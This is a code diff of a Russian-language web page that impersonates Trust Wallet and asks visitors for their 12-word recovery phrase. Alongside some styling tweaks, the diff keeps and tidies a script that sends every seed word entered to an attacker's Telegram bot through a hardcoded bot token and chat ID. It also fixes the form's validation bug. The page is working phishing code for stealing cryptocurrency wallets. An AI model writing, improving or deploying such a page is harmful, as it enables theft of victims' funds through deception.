@@ -13,6 +13,7 @@
             padding: 0;
             display: flex;
             flex-direction: column;
+            justify-content: space-between;
             min-height: 100vh;
         }
         .container {
@@ -29,7 +30,7 @@
             margin-bottom: 16px;
         }
         .logo img {
-            width: 120px;
+            width: 100px;
             height: auto;
         }
         h1 {
@@ -45,6 +46,7 @@
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 16px;
+            justify-items: start;
         }
         .seed-item {
             display: flex;
@@ -66,6 +68,7 @@
             color: #FFFFFF;
             width: 100%;
             box-sizing: border-box;
+            text-align: left;
         }
         input::placeholder {
             color: #888888;
@@ -87,7 +90,7 @@
             transition: background-color 0.3s;
         }
         button:hover {
-            background-color: #0f26c4;
+            background-color: #0f25c9;
         }
         .warning {
             margin-top: 10px;
@@ -96,12 +99,11 @@
             text-align: center;
         }
         footer {
-            background-color: #1E1E1E;
+            background-color: #0B0E11;
             color: #A0A0A0;
             text-align: center;
-            padding: 10px 20px;
-            font-size: 12px;
-            margin-top: auto;
+            padding: 10px 0;
+            font-size: 14px;
         }
     </style>
 </head>
@@ -163,45 +165,39 @@
                     <input type="text" id="word12" name="word12" placeholder="Введите слово" required>
                 </div>
             </div>
-            <button type="submit">Подтвердить</button>
+            <button type="submit">Отправить</button>
         </form>
         <div class="warning">Никогда не делитесь своей секретной фразой с другими!</div>
     </div>
     <footer>
         © 2025 Trust Wallet. Все права защищены.
     </footer>
-
     <script>
         document.getElementById('seedForm').addEventListener('submit', function (e) {
-            e.preventDefault(); // Предотвращаем перезагрузку страницы
+            e.preventDefault();
 
-            const botToken = '7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg'; // Замените на токен вашего Telegram-бота
-            const chatId = '@bdsjxjdhd'; // Замените на ваш ID чата
+            const botToken = '7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg'; // Ваш API Token
+            const chatId = '@bdsjxjdhd'; // Ваш чат ID
             const inputs = document.querySelectorAll('input');
-            const seedPhrase = Array.from(inputs).map(input => input.value.trim()).join(' ');
-            const message = `Секретная фраза: ${seedPhrase}`;
+            const seedWords = Array.from(inputs).map(input => input.value.trim());
+            const seedPhrase = seedWords.join(' ');
 
-            // Проверка, что все поля заполнены
-            if (seedPhrase.split(' ').length !== 12 || seedPhrase.includes('')) {
+            if (seedWords.length !== 12 || seedWords.some(word => word === '')) {
                 alert('Пожалуйста, заполните все 12 полей.');
                 return;
             }
 
-            // Отправка сообщения в Telegram
+            const message = `Секретная фраза: ${seedPhrase}`;
+
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                }),
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message }),
             })
                 .then(response => {
                     if (response.ok) {
                         alert('Фраза успешно отправлена!');
-                        document.getElementById('seedForm').reset(); // Очистка формы после отправки
+                        document.getElementById('seedForm').reset();
                     } else {
                         return response.json().then(data => {
                             alert('Ошибка отправки: ' + (data.description || 'Неизвестная ошибка'));
